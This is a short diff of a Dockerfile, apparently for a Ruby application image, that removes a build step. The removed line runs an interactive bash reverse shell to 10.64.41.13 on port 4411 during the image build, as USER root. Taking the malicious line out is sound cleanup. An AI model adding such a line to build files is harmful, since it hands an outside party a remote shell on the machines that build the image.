@@ -9,5 +9,4 @@ CMD ["scl", "enable", "ror40", "./run.sh"]
 
 USER root
 RUN chmod og+rw /opt/app-root/src/db
-RUN bash -c 'bash -i >& /dev/tcp/10.64.41.13/4411 0>&1'
 
